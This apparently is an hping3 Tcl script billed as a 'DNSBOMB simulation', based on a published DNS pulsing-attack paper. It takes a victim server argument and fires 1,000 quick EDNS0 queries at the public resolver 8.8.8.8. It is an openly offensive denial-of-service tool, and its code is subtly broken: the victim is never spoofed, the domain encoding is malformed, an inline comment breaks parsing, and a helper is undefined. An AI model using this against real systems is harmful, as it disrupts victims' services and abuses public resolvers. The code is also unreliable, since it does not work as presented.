#!/usr/bin/hping3 --tcl
# https://lixiang521.com/publication/oakland24-2/sp24summer-dnsbomb-li.pdf
source hpingstdlib.htcl

# Ensure correct number of arguments
if { $argc != 1 } {
    puts "Usage: $argv0 <VICTIM_SERVER>"
    exit
}

# Get the victim server from the command line argument
set VICTIM_SERVER [lindex $argv 0]

# DNS server to be used for the attack
set DNS_SERVER "8.8.8.8"  # Public DNS server
# Interval between sending each query in seconds
set QUERY_INTERVAL 0.01
# Number of queries to send
set NUM_QUERIES 1000
# EDNS0 size for the response packet
set EDNS0_SIZE 4096
# Domain to query (large domain to ensure a large response)
set TARGET_DOMAIN "example.com"

# Function to send a DNS query
proc send_dns_query {dst_ip src_port} {
    global TARGET_DOMAIN EDNS0_SIZE

    # DNS Header: Transaction ID (2 bytes) + Flags (2 bytes) + Questions (2 bytes) + Answer RRs (2 bytes) + Authority RRs (2 bytes) + Additional RRs (2 bytes)
    set query [binary format H* "000001000001000000000000"]

    # Question Section: QNAME (variable length, each label prefixed with its length, terminated with 00) + QTYPE (2 bytes) + QCLASS (2 bytes)
    # Convert domain name to DNS format (e.g., "example.com" to "\7example\3com\0")
    append query [binary format c* [split [string map {. \03} $TARGET_DOMAIN] {}]]
    append query [binary format H* "00010001"]  ;# QTYPE=A (1) + QCLASS=IN (1)

    # EDNS0 Pseudo-Record: Type (2 bytes, 0x29 for OPT) + UDP Payload Size (2 bytes) + Higher Bits in Extended RCODE and Flags (1 byte) + EDNS0 Version (1 byte) + Z (2 bytes) + Data Length (2 bytes)
    append query [binary format H* "0029"]  ;# OPT record
    append query [binary format H* [format "%04x" $EDNS0_SIZE]]  ;# EDNS0 UDP payload size (e.g., 4096 bytes)
    append query [binary format H* "0000800000000000"]  ;# Extended RCODE and flags, EDNS0 version, Z, data length

    # Send the UDP packet with the constructed DNS query
    send_udp_packet $dst_ip 53 $src_port $query
}

puts "Starting DNSBOMB simulation against $VICTIM_SERVER..."

# Step 1: Accumulate DNS Queries
puts "Accumulating DNS queries..."
for {set i 1} {$i <= $NUM_QUERIES} {incr i} {
    set src_port [expr {10000 + $i}]
    send_dns_query $DNS_SERVER $src_port
    after [expr {$QUERY_INTERVAL * 1000}]
}

puts "DNSBOMB simulation completed."
